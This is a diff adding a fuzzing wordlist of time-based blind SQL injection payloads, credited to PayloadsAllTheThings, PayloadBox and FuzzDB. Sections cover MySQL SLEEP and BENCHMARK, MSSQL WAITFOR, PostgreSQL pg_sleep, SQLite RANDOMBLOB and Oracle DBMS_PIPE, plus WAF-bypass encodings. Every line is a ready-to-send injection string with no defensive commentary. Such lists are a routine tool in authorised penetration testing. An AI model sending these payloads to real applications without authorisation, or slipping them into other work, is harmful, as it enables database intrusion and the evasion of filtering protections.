@@ -1,0 +1,152 @@
+# Time-Based Blind SQL Injection Payloads
+# 来源: PayloadsAllTheThings, PayloadBox, FuzzDB
+# 大神级时间盲注payload集合
+
+# === MySQL SLEEP ===
+sleep(5)#
+1 or sleep(5)#
+" or sleep(5)#
+' or sleep(5)#
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+' or sleep(5)--
+" or sleep(5)--
+') or sleep(5)--
+") or sleep(5)--
+')) or sleep(5)--
+")) or sleep(5)--
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+' AnD SLEEP(5) ANd '1
+'&&SLEEP(5)&&'1
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
++ SLEEP(10) + '
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+1 AND (SELECT SLEEP(5) FROM DUAL WHERE DATABASE() LIKE '%')#
+' AND SLEEP(5)=0--
+" AND SLEEP(5)=0--
+AND SLEEP(10)=0
+XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR
+OR ELT(1=1,SLEEP(5))
+RLIKE SLEEP(5)
+
+# === MySQL BENCHMARK ===
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
++benchmark(3200,SHA1(1))+'
+AND BENCHMARK(5000000,SHA1('test'))--
+' AND BENCHMARK(5000000,MD5(NOW()))--
+" AND BENCHMARK(5000000,MD5(NOW()))--
+
+# === MSSQL WAITFOR ===
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'--
+waitfor delay '00:00:05'#
+1;waitfor delay '0:0:10'--
+1 waitfor delay '0:0:10'--
+a' waitfor delay '0:0:10'--
+IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
+1;IF([INFERENCE]) WAITFOR DELAY '0:0:5'--
+';IF(1=1) WAITFOR DELAY '0:0:5'--
+";IF(1=1) WAITFOR DELAY '0:0:5'--
+
+# === PostgreSQL pg_sleep ===
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+' or pg_sleep(5)--"
+" or pg_sleep(5)--
+)) or pg_sleep(5)--"
+AND (SELECT pg_sleep(5))--
+'; SELECT pg_sleep(5)--
+"; SELECT pg_sleep(5)--
+
+# === SQLite RANDOMBLOB ===
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+
+# === Oracle DBMS_PIPE ===
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+" AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
+'; BEGIN DBMS_LOCK.SLEEP(5); END;--
+"; BEGIN DBMS_LOCK.SLEEP(5); END;--
+
+# === WAF Bypass Time-Based ===
+'/**/AND/**/SLEEP(3)--
+'%09AND%09SLEEP(3)--
+'%0aAND%0aSLEEP(3)--
+'%0dAND%0dSLEEP(3)--
+'+AND+SLEEP(3)--
+'/*!50000AND*/SLEEP(3)--
+'/*!SLEEP(3)*/--
+' AND (SELECT SLEEP(5) FROM (SELECT 1)x)--
